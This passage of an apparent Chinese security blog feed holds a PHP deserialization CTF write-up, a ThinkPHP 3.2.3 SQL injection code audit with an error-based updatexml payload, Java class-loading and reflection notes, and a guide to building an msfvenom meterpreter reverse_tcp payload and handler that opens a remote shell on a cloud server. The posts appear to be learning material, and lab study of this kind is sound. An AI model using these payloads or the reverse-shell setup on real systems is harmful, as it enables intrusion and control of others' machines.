class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">new</span> Modifier();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> show();</span><br><span class="line">$b = <span class="keyword">new</span> show(); </span><br><span class="line">$b-&gt;str= <span class="string">""</span>;</span><br><span class="line">$b-&gt;source = $a;</span><br><span class="line">var_dump($b);</span><br><span class="line">var_dump(urlencode(serialize($b)));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/daimashenji/image-20201122204935390.png" alt="image-20201122204935390"></p><p>解码之后就拿到flag</p><p><img src="/images/daimashenji/image-20201122205039941.png" alt="image-20201122205039941"></p><h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><p><a href="https://blog.csdn.net/qq_43801002/article/details/106117236" target="_blank" rel="noopener">https://blog.csdn.net/qq_43801002/article/details/106117236</a></p><p><a href="https://www.cnblogs.com/karsa/p/12806945.html" target="_blank" rel="noopener">https://www.cnblogs.com/karsa/p/12806945.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;夯实基础&quot;&gt;&lt;a href=&quot;#夯实基础&quot; class=&quot;headerlink&quot; title=&quot;夯实基础&quot;&gt;&lt;/a&gt;夯实基础&lt;/h4&gt;&lt;p&gt;这里先直接看一下代码&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td cl
      
    
    </summary>
    
      <category term="web安全" scheme="http://onekingcc.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="web安全" scheme="http://onekingcc.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Thinkphp3.2.3 框架sql注入</title>
    <link href="http://onekingcc.github.io/2020/09/07/Thinkphp3.2.3%20sql%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/"/>
    <id>http://onekingcc.github.io/2020/09/07/Thinkphp3.2.3 sql注入分析/</id>
    <published>2020-09-07T06:05:50.588Z</published>
    <updated>2020-11-12T03:46:45.310Z</updated>
    
    <content type="html"><![CDATA[<p>1.写这个文章的目的是什么？</p><p>这个框架也比较老了，现在都有6.0了吧，那为什么要分析这么老的东西呢，主要是学习代码审计，知其然知其所以然。</p><p>环境： Thinkphp3.2.3 + mamp + PHPSTORM</p><p>现在很多都是mvc的开发模式，而且很多cms会在thinkphp进行二次开发，所以知道这种开发模式是很有必要的</p><p>mvc 就是将视图 控制 数据 进行分开的开发模式</p><p>Model模型：这个一般都是程序的核心，主要就是负责存取数据，然后负责逻辑操作。</p><p>View视图：是应用程序中处理数据显示的部分。然后视图是依据模型数据创建的。其实就是展示html页面</p><p>Controller：控制器负责从视图读取数据，控制用户输入，并向模型发送数据。一般都是类文件，通过里面的方法来对整个web应用增删改查之类的操作。</p><h4 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h4><p><img src="/images/daimashenji/image-20200906000610051.png" alt="image-20200906000610051"></p><p><img src="/images/daimashenji/image-20200906000358043.png" alt="image-20200906000358043"></p><p>里面有一个很重要的文件在\ThinkPHP\library\Think\Model.class.php 这个文件夹包含了很多的连贯操作，就是对数据库的连贯性，而且连贯操作方法是没有调用顺序的，举个例子调用了where之后然后再对order进行排序。查询User表中满足状态值为200的前10条记录，并按照时间排序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$User-&gt;order(&apos;create_time&apos;)-&gt;limit(10)-&gt;where(&apos;status=200&apos;)-&gt;select();</span><br></pre></td></tr></table></figure><p>这里的where，order ，limit方法就称为连贯操作方法，所有的连贯操作都返回当前的模型实例对象（this），如果带*标识的表示支持多次调用。还有\ThinkPHP\library\Think\Db\Driver.class.php文件也比较重要包括了数据分析，各种操作数据库之类的,这里看Structure就知道了看这些是否有必要了</p><p><img src="/images/daimashenji/image-20200906003255263.png" alt="image-20200906003255263"></p><p>这里Model.class.php 的limit方法就算你传入的$offset的字符串没有过滤,最后也会将你的值强制转换成整型</p><h4 id="where常规注入"><a href="#where常规注入" class="headerlink" title="where常规注入"></a>where常规注入</h4><p>where():字符串的方式将条件作为where方法的参数就会产生注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">M(&apos;user&apos;)-&gt;where(&apos;id=&apos;.I(&apos;id&apos;))-&gt;find()</span><br></pre></td></tr></table></figure><p>但是如果是数组查询进入_parseType方法分析，数组的val值就会转换为int</p><p>这里测试一下用官方的写法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getUserIndex</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="comment">/* $User = A('User');</span></span><br><span class="line"><span class="comment">   $User-&gt;index();*/</span></span><br><span class="line">    $data = M(<span class="string">'User'</span>)-&gt;where(<span class="string">'id='</span>.I(<span class="string">'id'</span>))-&gt;find();</span><br><span class="line">    dump($data);</span><br></pre></td></tr></table></figure><p>然后进行访问很明显id这里是存在注入点的</p><p><img src="/images/daimashenji/image-20200906160837306.png" alt="image-20200906160837306"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">222) and =(updatexml(1,(concat(0x7e,(select user()),0x7e)),1)</span><br></pre></td></tr></table></figure><p>利用报错注入闭合语句就可以了</p><p><img src="/images/daimashenji/image-20200906163603000.png" alt="image-20200906163603000"></p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>在对应处下断点进行调试</p><p><img src="/images/daimashenji/image-20200906172859905.png" alt="image-20200906172859905"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data = M(<span class="string">'User'</span>)</span><br></pre></td></tr></table></figure><p>这个其实就是快速实例化一个User模型类，等效于 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data = <span class="keyword">new</span> Model(<span class="string">'User'</span>)</span><br></pre></td></tr></table></figure><p>会走到I方法，对传进来的参数$name 先进行htmlspecialchars，然后进行think_filter处理</p><p><img src="/images/daimashenji/image-20200907124705224.png" alt="image-20200907124705224"></p><p>F7跟进一直跟到1798行的时候会进入到一个where方法</p><p><img src="/images/daimashenji/image-20200906165620942.png" alt="image-20200906165620942"></p><p>这里F7跟进去看看，发现在1808行的时候会对where方法传进的值进行判断，判断是否是字符串，并且非空，如果满足条件就进入到该分支里面，我们的值很明显是满足条件</p><p><img src="/images/daimashenji/image-20200906165717247.png" alt="image-20200906165717247"></p><p>在跟到1816行的时候返回的是一个string类型一个数组，key是_string ,val等于id=222s</p><p><img src="/images/daimashenji/image-20200906165759568.png" alt="image-20200906165759568"></p><p>一直跟到489行的时候进入到了核心位置，到了paresWhere()方法，满足条件</p><p><img src="/images/daimashenji/image-20200906170643966.png" alt="image-20200906170643966"></p><p>在510行的时候进入到parseThinkWhere方法中</p><p><img src="/images/daimashenji/image-20200906171130633.png" alt="image-20200906171130633"></p><p>继续跟，可以发现$key的值为_string,进入到字符串查询模式</p><p><img src="/images/daimashenji/image-20200906171407011.png" alt="image-20200906171407011"></p><p>在650行的时候返回id=222s</p><p><img src="/images/daimashenji/image-20200906171556311.png" alt="image-20200906171556311"></p><p>539行的时候继续进行拼接</p><p><img src="/images/daimashenji/image-20200906171707521.png" alt="image-20200906171707521"></p><p>543行的时候继续内部拼接，返回带括号的id=222s</p><p><img src="/images/daimashenji/image-20200906171957173.png" alt="image-20200906171957173"></p><p>一直跟到993行的时候，最终可以看到返回了完整的sql<img src="/images/daimashenji/image-20200906172331233.png" alt="image-20200906172331233"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;1.写这个文章的目的是什么？&lt;/p&gt;
&lt;p&gt;这个框架也比较老了，现在都有6.0了吧，那为什么要分析这么老的东西呢，主要是学习代码审计，知其然知其所以然。&lt;/p&gt;
&lt;p&gt;环境： Thinkphp3.2.3 + mamp + PHPSTORM&lt;/p&gt;
&lt;p&gt;现在很多都是mvc的
      
    
    </summary>
    
      <category term="web安全" scheme="http://onekingcc.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>java基础学习</title>
    <link href="http://onekingcc.github.io/2020/07/11/java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E7%B1%BB%E7%9A%84%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/"/>
    <id>http://onekingcc.github.io/2020/07/11/java基础学习之类的加载机制/</id>
    <published>2020-07-11T07:47:53.021Z</published>
    <updated>2020-11-12T03:50:46.313Z</updated>
    
    <content type="html"><![CDATA[<h3 id="类的加载机制"><a href="#类的加载机制" class="headerlink" title="类的加载机制"></a>类的加载机制</h3><p>类加载机制也叫ClassLoader，所有的类加载器（除了根类加载器），都必须是继承java.lang.classloader.。然后java它是依赖于JVM的东西，其实就是个虚拟机。首先java是一种编译型的语言，然后java的程序在运行程序前首先编译成class文件这样才能被jvm运行 ,然后java类初始化的时候首先是会加载类字节码。JVM在执行类之前会先解析class二进制内容，JVM执行生成的字节码(<code>ByteCode</code>)。个人理解说白了类加载就是将磁盘上的class文件加载到内存中，如有不对,还望斧正。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.onekingcc.day1;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SingleTon</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> count1;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> count2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> SingleTon instance = <span class="keyword">new</span> SingleTon(); <span class="comment">// 结果为1 1</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">SingleTon</span><span class="params">()</span></span>&#123;</span><br><span class="line">        count1++;</span><br><span class="line">        count2++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> SingleTon <span class="title">getInstance</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//上面就是一个简单的单例模式</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassLoadTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">    SingleTon.getInstance();</span><br><span class="line">    System.out.println(SingleTon.count1);</span><br><span class="line">    System.out.println(SingleTon.count2);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果这里将private static SingleTon instance = new SingleTon(); 放在上面就变1，0</p><p><img src="/images/image-20200711151016164.png" alt="image-20200711151016164"></p><p>1.初始化阶段，才真正的开始执行类中定义java程序代码，</p><p>2.初始化阶段他执行的是<strong>类构造器<client>()方法</client></strong>，对象构造器我们都知道，对象的构造器 就是创建每一个对象就会实现对象的初始化方法。然后类构造器的话我理解的就是类在字节码加载的时候会执行的初始化的方法叫类构造方法。</p><p>类加载-&gt;连接验证-&gt;准备-&gt;解析-&gt;初始化</p><p><img src="/images/image-20200711153759074.png" alt="image-20200711153759074"></p><p>绿色圈中的则是在准备阶段，准备阶段为0，也没问题，count1=0 ，count2=0，在第三行的时候就会去执行构造器里面的构造方法++，所以count1=1 ，count2=1。</p><p>第二种先new，程序自上而下执行，会去触发你的加载连接初始化，在初始化的时候也有一个client&lt;&gt;方法 ，因为有静态的成员  ，在new的时候就要去执行构造器里面的构造方法++，这时你的count1=1，count2=1。接下来就是执行第二句，它啥也没有做，而第三句做了个初始化操作。重新赋值。所以最后变成了count1=1，count2=0.还有注意一点就是变量不能引用在它定义这个字段之前，因为在初始化的时候执行类构造器方法，这个顺序是<strong>源文件中出现的顺序决定的</strong>可以赋值但不能访问。</p><h3 id="java的反射机制"><a href="#java的反射机制" class="headerlink" title="java的反射机制"></a>java的反射机制</h3><p>java反射( Java Reflection),反射机制它允许在程序执行的时候借助Relection API去取的任何类的内部信息，然后能直接操作任意对象的内部属性和方法。前面说了类的加载机制，那么加载完类之后，就会在内存中产生一个Class类型的对象然后一个类的话里面只有一个Class对象。有点去回调函数的意思。</p><p>然后一般主要的API有：</p><p>java.lang.Class:代表一个类</p><p>Java.lang,refelect.Method：代表一个类的方法</p><p>java.lang.refelect.Filed:代表类的成员变量</p><p>java.lang.refelect.Constructor:类的构造器</p><p>一直在讲反射，先看一下如果没有反射的时候具体是怎么操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.onekingcc.day1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Person&#123;"</span> +</span><br><span class="line">                <span class="string">"age="</span> + age +</span><br><span class="line">                <span class="string">", name='"</span> + name + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">'&#125;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(<span class="keyword">int</span> age, String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Person</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"hello，I'm person"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span>  String <span class="title">showHobby</span><span class="params">(String hobby)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"我的爱好是 "</span>+ hobby);</span><br><span class="line">        <span class="keyword">return</span> hobby;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先定义一个Person类正常我们想去调用Person类中的成员方法和属性如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.onekingcc.day1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line">         <span class="comment">//反射之前</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectionTest</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Person person1 = <span class="keyword">new</span> Person(<span class="number">18</span>,<span class="string">"onekingcc"</span>);</span><br><span class="line">        <span class="comment">//通过对象调用内部的属性和方法</span></span><br><span class="line">        person1.name = <span class="string">"jack"</span>;</span><br><span class="line">        System.out.println(person1.toString());</span><br><span class="line">        person1.show();</span><br><span class="line">        <span class="comment">//在Person类的外部是不可以调用其内部的私有结构.包括方法及其内部的成员属性</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>参考链接：</p><p><a href="https://p0sec.net/index.php/archives/121/" target="_blank" rel="noopener">https://p0sec.net/index.php/archives/121/</a></p><p><a href="https://xz.aliyun.com/t/136" target="_blank" rel="noopener">https://xz.aliyun.com/t/136</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;类的加载机制&quot;&gt;&lt;a href=&quot;#类的加载机制&quot; class=&quot;headerlink&quot; title=&quot;类的加载机制&quot;&gt;&lt;/a&gt;类的加载机制&lt;/h3&gt;&lt;p&gt;类加载机制也叫ClassLoader，所有的类加载器（除了根类加载器），都必须是继承java.lang.cl
      
    
    </summary>
    
      <category term="web安全" scheme="http://onekingcc.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="web安全" scheme="http://onekingcc.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>阿里云服务器搭建外网msf</title>
    <link href="http://onekingcc.github.io/2020/06/03/%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E5%A4%96%E7%BD%91msf/"/>
    <id>http://onekingcc.github.io/2020/06/03/阿里云服务器搭建外网msf/</id>
    <published>2020-06-03T14:28:13.160Z</published>
    <updated>2020-11-14T06:27:41.278Z</updated>
    
    <content type="html"><![CDATA[<h2 id="阿里云服务器搭建外网msf"><a href="#阿里云服务器搭建外网msf" class="headerlink" title="阿里云服务器搭建外网msf"></a>阿里云服务器搭建外网msf</h2><p>这里之所以写它，是因为之前买了台阿里云的服务器，搭建过程中也遇到了很多坑，这里使用的是xshell工具连接我的远程服务器，服务器的系统是Ubuntu 18.04，登录进去首先切换成root权限</p><h3 id="踩坑1"><a href="#踩坑1" class="headerlink" title="踩坑1"></a>踩坑1</h3><p>这里我之前只是将自己本机防火墙关闭，然后在监听的时候监听是能监听，但是我触发的可执行文件一直没有会话，忽略阿里云本身还有自带的防火墙，所以要将阿里云的服务器也关掉</p><h3 id="安装metasploit"><a href="#安装metasploit" class="headerlink" title="安装metasploit"></a>安装metasploit</h3><p>安装之前要看你的服务是否能够访问外网可以用<code>curl www.baidu.com</code>测试一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 获取MSF</span><br><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall</span><br><span class="line">chmod 755 msfinstall    // 修改权限</span><br><span class="line">./msfinstall    // 开始安装</span><br></pre></td></tr></table></figure><h3 id="安装Nmap"><a href="#安装Nmap" class="headerlink" title="安装Nmap"></a>安装Nmap</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install namp</span><br></pre></td></tr></table></figure><h3 id="安装postgresql"><a href="#安装postgresql" class="headerlink" title="安装postgresql"></a>安装postgresql</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt-get install postgresql  //安装postgresql数据库</span><br><span class="line">su postgres                 //切换到postgres用户</span><br><span class="line">psql                //登录数据库，首次登录没有密码</span><br><span class="line">\password postgres          //修改密码</span><br><span class="line">\q                          //退出</span><br></pre></td></tr></table></figure><h3 id="生成木马文件"><a href="#生成木马文件" class="headerlink" title="生成木马文件"></a>生成木马文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=外网ip LPORT=监听的端口 -f exe &gt;x64.exe</span><br></pre></td></tr></table></figure><p><img src="/images/shentouceshi/1569485138005.png" alt="1569485138005"></p><h3 id="启动msf"><a href="#启动msf" class="headerlink" title="启动msf"></a>启动msf</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole      //启动msf</span><br><span class="line">use exploit/multi/handler //监听</span><br><span class="line">set payload windows/x64/meterpreter/reverser_tcp //设置载荷</span><br><span class="line">set LHOST 0.0.0.0</span><br><span class="line">set LPORT //监听的端口</span><br><span class="line">exploit  //执行</span><br></pre></td></tr></table></figure><p><img src="/images/shentouceshi/1569485605886.png" alt="1569485605886"></p><p>这里将之前的生成的x64.exe执行文件放在我们的本机 ，本机执行这个文件，这时将被监听，新建一个会话将文件下载到本机<code>sz x64.exe</code></p><p><img src="/images/shentouceshi/1569486332944.png" alt="1569486332944"></p><p>这时我们就直接进入目标的shell</p><p><img src="/images/shentouceshi/1569486454599.png" alt="1569486454599"></p><p>查看目标机信息：</p><p><img src="/images/shentouceshi/1569487055550.png" alt="1569487055550"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里我的服务器生成exe，将exe下载到本地电脑，本地电脑相当于目标机器，exe就相当于一个反向链接程序，将流量转发到我的攻击机器上。</p><p>reference：<a href="http://ximcx.cn/post-117.html" target="_blank" rel="noopener">http://ximcx.cn/post-117.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;阿里云服务器搭建外网msf&quot;&gt;&lt;a href=&quot;#阿里云服务器搭建外网msf&quot; class=&quot;headerlink&quot; title=&quot;阿里云服务器搭建外网msf&quot;&gt;&lt;/a&gt;阿里云服务器搭建外网msf&lt;/h2&gt;&lt;p&gt;这里之所以写它，是因为之前买了台阿里云的服务器，搭建
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://onekingcc.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>记一次todolist的开发过程</title>
    <link href="http://onekingcc.github.io/2020/06/03/%E8%AE%B0%E4%B8%80%E6%AC%A1todolist%E7%9A%84%E5%BC%80%E5%8F%91%E8%BF%87%E7%A8%8B/"/>
    <id>http://onekingcc.github.io/2020/06/03/记一次todolist的开发过程/</id>
    <published>2020-06-03T14:28:13.130Z</published>
    <updated>2019-08-19T02:26:40.012Z</updated>
    
    <content type="html"><![CDATA[<h2 id="实现toDoList"><a href="#实现toDoList" class="headerlink" title="实现toDoList"></a>实现<code>toDoList</code></h2><h3 id="todolist功能需求"><a href="#todolist功能需求" class="headerlink" title="todolist功能需求"></a>todolist功能需求</h3><p>①  文本框里面输入内容，按下回车，就可以生成待办事项</p><p>②  点击代办事项复选框，就可以把当前的数据添加到已完成的事项里面</p><p>③  点击已完成的复选框，就可以把当前数据添加到待办事项里面</p><p>④  然后刷新本页面数据不会丢失</p><h3 id="todolist思路分析"><a href="#todolist思路分析" class="headerlink" title="todolist思路分析"></a>todolist思路分析</h3><p>​    这里要求刷新页面数据不会丢失因此需要用本地存储<code>localstorage</code>这里不管是按下的是回车，还是点击的复选框，都是把本地存储的数据加载到页面中，这样保证刷新的时候不会丢失数据。存储的格式 var todolist = [{title: ‘ xxx’,done :’false’}]</p><p>这里本地存储<code>localstorage</code>只能存储字符串的格式,因此需要将对象转换为字符串<code>JSON.stringfy(data)</code></p><h3 id="按下回车数据存储到本地存储"><a href="#按下回车数据存储到本地存储" class="headerlink" title="按下回车数据存储到本地存储"></a>按下回车数据存储到本地存储</h3><p>​    这里要注意的是页面的数据都是从本地存储里面存取的，这样页面就不会丢失数据，所以要将数据保存到本地</p><p>​    利用事件对象keycode判断用户是否按下回车(13)</p><p>​    声明一个数组，保存数据</p><p>​    先要读取本地原来存储的数据(getData())放到数组里面</p><p>之后将最新的数据从表单获取过来的数据，追加到数组中，这里因为这个数组是在内存当中</p><p>所以最后将数组存储到本地存储(声明函数``saveData()`</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">"#title"</span>).on(<span class="string">"keydown"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (event.keyCode === <span class="number">13</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($(<span class="keyword">this</span>).val() === <span class="string">""</span>) &#123;</span><br><span class="line">                alert(<span class="string">"请输入您要的操作"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 先读取本地存储原来的数据</span></span><br><span class="line">                <span class="keyword">var</span> local = getDate();</span><br><span class="line">                <span class="comment">// console.log(local);</span></span><br><span class="line">                <span class="comment">// 把local数组进行更新数据 把最新的数据追加给local数组</span></span><br><span class="line">                local.push(&#123; <span class="attr">title</span>: $(<span class="keyword">this</span>).val(), <span class="attr">done</span>: <span class="literal">false</span> &#125;);</span><br><span class="line">                <span class="comment">// 把这个数组local 存储给本地存储</span></span><br><span class="line">                saveDate(local);</span><br><span class="line">                <span class="comment">// 2. toDoList 本地存储数据渲染加载到页面</span></span><br><span class="line">                load();</span><br><span class="line">                $(<span class="keyword">this</span>).val(<span class="string">""</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="读取本地数据，保存本地数据"><a href="#读取本地数据，保存本地数据" class="headerlink" title="读取本地数据，保存本地数据"></a>读取本地数据，保存本地数据</h3><figure class="highlight 